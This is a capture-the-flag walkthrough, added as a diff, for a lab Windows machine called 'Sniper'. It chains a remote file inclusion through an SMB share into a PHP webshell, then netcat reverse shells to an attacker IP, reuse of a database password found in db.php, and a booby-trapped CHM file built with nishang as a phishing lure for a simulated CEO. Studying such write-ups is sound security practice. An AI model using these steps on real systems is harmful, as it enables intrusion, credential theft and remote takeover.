@@ -1,0 +1,191 @@
+Initial Shell:
+
+Frist test the vuln url: http://10.10.10.151/blog/?lang=blog-en.php
+using this : http://10.10.10.151/blog/?lang=.\blog-en.php  (.\ cause it's windows server)
+And we can test it by sending /blog/?lang=\windows\win.ini   
+the response shows this in content:
+</html>
+; for 16-bit app support
+
+[fonts]
+
+[extensions]
+
+[mci extensions]
+
+[files]
+
+[Mail]
+
+MAPI=1
+
+</body>
+</html>
+
+Vuln confirmed.
+
+
+
+
+
+GOOD, show the responser correctly !
+
+U can try some LFI, but now we go to the point : RFI
+
+Follow the article, cause this box will block php upload via HTTP(S)
+http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html
+
+apt-get install samba
+mkdir /var/www/html/pub/
+chmod 0555 /var/www/html/pub/
+chown -R nobody:nogroup /var/www/html/pub/
+echo > /etc/samba/smb.conf
+
+Put below mentioned content in file '/etc/samba/smb.conf'
+[global]
+workgroup = WORKGROUP
+server string = Samba Server %v
+netbios name = indishell-lab
+security = user
+map to guest = bad user
+name resolve order = bcast host
+dns proxy = no
+bind interfaces only = yes
+
+[ica]
+path = /var/www/html/pub
+writable = no
+guest ok = yes
+guest only = yes
+read only = yes
+directory mode = 0555
+force user = nobody
+
+
+service smbd stop
+service smbd start 
+
+now download the webshell here : 
+https://github.com/WhiteWinterWolf/wwwolf-php-webshell
+
+Then upload via smbd service using this below:
+http://10.10.10.151/blog/?lang=\\10.10.14.219\ica\webshell.php
+
+then you'll get an ugly webshell :P
+
+
+After that, upload nc.exe to get a nice reverse shell
+1. Create a folder 
+>  mkdir C:\tmp
+
+2. upload browse 'nc.exe' and execute
+
+3. Execute Cmd nc
+> .\nc.exe -e cmd.exe 10.10.15.82 1122
+
+
+
+Get an initial shell :D !
+
+=======================================================================
+
+User Shell:
+
+We can found creds at C:\inetpub\wwwroot\user\db.php
+C:\inetpub\wwwroot\user>type db.php
+type db.php
+<?php
+// Enter your Host, username, password, database below.
+// I left password empty because i do not set password on localhost.
+$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
+// Check connection
+if (mysqli_connect_errno())
+  {
+  echo "Failed to connect to MySQL: " . mysqli_connect_error();
+  }
+?>
+
+
+
+And net user & view the Users dir found out that there's a Chris user.
+smbmap working with Chris:36mEAhz/B8xQ~2VM
+
+So let's try out switch user to chris.
+
+this is my script to chris :
+root@kali:~/Desktop/htb/sniper# cat suchris.ps1 
+$pass = ConvertTo-SecureString '36mEAhz/B8xQ~2VM' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential ('sniper\Chris', $pass)
+Invoke-Command -ComputerName sniper -Credential $cred -ScriptBlock { C:\tmp\nc.exe -e cmd.exe 10.10.15.82 1133 }
+
+
+REMEMBER ! You HAVE TO allow anybody to read write execute the nc.exe
+execute icacls nc.exe /grant Everyone:F as authority\iusr ( either webshell or reverse shell )
+> icacls nc.exe /grant Everyone:F
+
+run the suchris.ps1 and set a listener , you should get a sniper\chris shell.
+C:\tmp>powershell
+powershell
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+.\PS C:\tmp> suchris.ps1
+.\suchris.ps1
+
+
+===================================================================================================================
+
+Root Shell:
+
+There's note.txt locate at C:\Docs
+C:\Docs>type note.txt
+type note.txt
+Hi Chris,
+	Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.
+
+Regards,
+Sniper CEO.
+
+K, it means that if we upload file here the CEO might open it :D
+
+Then we could find a file locate at : C:\Users\Chris\Downloads\instructions.chm
+download it by nc, view it via windows.
+
+it's a doc, and CEO told Chris to give a doc to him :P
+So........ send a BAAD chm to CEO at C:\Docs might work.
+
+Create a malicious chm via here:
+https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1
+Remember create a malicious chm on ur own windows VM, bacause windows defender will block the Out-CHM.ps1 upload.
+
+Creattion:
+PS D:\PT\Mywriteups\sniper> Out-CHM -Payload 'C:\tmp\nc.exe -e cmd 10.10.15.82 7788' -HHCPath " C:\Program Files (x86)\HTML Help Workshop"
+Microsoft HTML Help Compiler 4.74.8702
+
+Compiling d:\PT\Mywriteups\sniper\doc.chm
+
+
+Compile time: 0 minutes, 0 seconds
+2       Topics
+4       Local links
+4       Internet links
+0       Graphics
+
+
+Created d:\PT\Mywriteups\sniper\doc.chm, 13,728 bytes
+Compression increased file by 570 bytes.
+
+Ok now upload it via webshell, it's easier , remember to name it different from doc,
+a lot people on server
+also remember icacls doc7788.chm /grant Everyone:F.
+
+Now put the file to C:\Docs
+> move C:\tmp\doc7788.chm C:\Docs
+
+Now wait for stupid CEO to click the malicious file :) !
+
+END
+==================================================================================================================================
+ 
+
+
